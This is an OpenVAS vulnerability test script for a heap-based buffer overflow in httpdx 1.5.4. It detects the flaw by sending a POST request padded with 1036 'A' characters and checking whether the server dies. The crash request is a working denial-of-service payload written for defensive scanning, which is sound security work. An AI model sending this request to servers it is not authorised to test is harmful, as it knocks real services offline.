##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_httpdx_post_req_bof_vuln.nasl 5958 2017-04-17 09:02:19Z teissa $
#
# httpdx 'POST' request Heap Based Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to execute
arbitrary code in the context of the application. Failed attacks will cause
denial of service conditions.

Impact Level: System/Application";

tag_affected = "httpdx version 1.5.4";

tag_insight = "The flaw is due to a boundary error when processing http POST
requests and can be exploited to cause a heap based buffer overflow via a
specially crafted packet.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running httpdx and is prone to buffer overflow
vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802663";
CPE = "cpe:/a:jasper:httpdx";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 5958 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-04-17 11:02:19 +0200 (Mon, 17 Apr 2017) $");
  script_tag(name:"creation_date", value:"2012-07-30 12:12:12 +0530 (Mon, 30 Jul 2012)");
  script_name("httpdx 'POST' request Heap Based Buffer Overflow Vulnerability");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/20120");

  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("gb_httpdx_server_detect.nasl");
  script_mandatory_keys("httpdx/installed");
  script_require_ports("Services/www",80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("host_details.inc");

## Variable Initialization
port = 0;
req = "";
res = "";

## Get HTTP Port
port = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(! port){
  exit(0);
}

## Construct attack Request
crash = crap(data: "A", length: 1036);
req = string("POST /test.pl HTTP/1.0\r\n",
             "Host: ", get_host_name(), "\r\n",
             "Content-Length: 1023\r\n",
             "Content-Type: text\r\n",
             "\r\n", crash);

## Send attack request
res = http_send_recv(port:port, data:req);

## Confirm httpdx is dead
if(http_is_dead(port:port)){
  security_message(port);
}
